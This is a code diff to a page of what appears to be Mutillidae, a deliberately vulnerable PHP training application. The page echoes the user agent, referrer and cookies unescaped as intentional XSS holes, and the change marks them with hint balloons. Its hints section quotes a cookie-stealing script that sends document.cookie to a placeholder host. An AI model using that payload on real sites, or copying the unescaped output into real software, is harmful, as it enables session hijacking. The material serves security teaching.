@@ -65,6 +65,25 @@
     }// end try;
 ?>
 
+<!-- Bubble hints code -->
+<?php 
+	try{
+   		$lReflectedXSSExecutionPointBallonTip = $BubbleHintHandler->getHint("ReflectedXSSExecutionPoint");
+   		$lJavaScriptInjectionPointBallonTip = $BubbleHintHandler->getHint("JavaScriptInjectionPoint");
+	} catch (Exception $e) {
+		echo $CustomErrorHandler->FormatError($e, "Error attempting to execute query to fetch bubble hints.");
+	}// end try	
+?>
+
+<script type="text/javascript">
+	$(function() {
+		$('[ReflectedXSSExecutionPoint]').attr("title", "<?php echo $lReflectedXSSExecutionPointBallonTip; ?>");
+		$('[ReflectedXSSExecutionPoint]').balloon();
+		$('[JavaScriptInjectionPoint]').attr("title", "<?php echo $lJavaScriptInjectionPointBallonTip; ?>");
+		$('[JavaScriptInjectionPoint]').balloon();
+	});
+</script>
+
 <div class="page-title">Browser Information</div>
 
 <?php include_once './includes/back-button.inc';?>
@@ -74,8 +93,8 @@
 	<tr><td class="non-wrapping-label">Client IP</td><td><?php echo $lClientIP; ?></td></tr>
     <tr><td class="non-wrapping-label">Client Hostname</td><td><?php echo $lClientHostname; ?></td></tr>
     <tr><td class="non-wrapping-label">Operating System</td><td><?php echo $lOperatingSystem ?></td></tr>
-    <tr><td class="non-wrapping-label">User Agent String</td><td><?php echo $lClientUserAgentString; ?></td></tr>
-    <tr><td class="non-wrapping-label">Referrer</td><td><?php echo $lClientReferrer; ?></td></tr>
+    <tr><td class="non-wrapping-label">User Agent String</td><td ReflectedXSSExecutionPoint="1"><?php echo $lClientUserAgentString; ?></td></tr>
+    <tr><td class="non-wrapping-label">Referrer</td><td ReflectedXSSExecutionPoint="1"><?php echo $lClientReferrer; ?></td></tr>
     <tr><td class="non-wrapping-label">Remote Client Port</td><td><?php echo $lClientPort; ?></td></tr>
     <tr><td class="non-wrapping-label">WhoIs info for client IP</td><td><pre><?php echo $lWhoIsInformation; ?></pre></td></tr>
 	<?php 
@@ -85,7 +104,7 @@
 		}// end foreach
 	}else{
 		foreach ($_COOKIE as $key => $value){
-	    	echo '<tr><td class="non-wrapping-label">Cookie '.$key.'</td><td>'.$value.'</pre></td></tr>';
+	    	echo '<tr><td ReflectedXSSExecutionPoint="1" class="non-wrapping-label">Cookie '.$key.'</td><td>'.$value.'</pre></td></tr>';
 		}// end foreach
 	}// end if
 	?>    
@@ -134,8 +153,8 @@
 		<td id="id_color_depth_enabled_td"></td>
 	</tr>
 	<tr>
-		<td class="non-wrapping-label">Referrer</td>
-		<td id="id_referrer_td"></td>
+		<td class="non-wrapping-label" JavaScriptInjectionPoint="1">Referrer</td>
+		<td id="id_referrer_td" JavaScriptInjectionPoint="1"></td>
 	</tr>
 	<tr>
 		<td class="non-wrapping-label">Plug-Ins</td>
@@ -187,7 +206,8 @@
 	// Begin hints section
 	if ($_SESSION["showhints"]) {
 		echo '
-			<table>
+			<br/ >
+			<table style="width:90%">
 				<tr><td class="hint-header">Hints</td></tr>
 				<tr>
 					<td class="hint-body">
@@ -201,11 +221,11 @@
 								could do which I plan show in a video later.
 							</li>
 						  	<li>For some hot cookie stealing action, try something like:
-								<pre>
-								&lt;script&gt;
-									new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
-								&lt;/script&gt;
-								</pre>	
+<code>
+&lt;script&gt;
+	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
+&lt;/script&gt;
+</code>	
 							</li>
 							<li>Check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
 								for more ways you can encode XSS attacks that may 
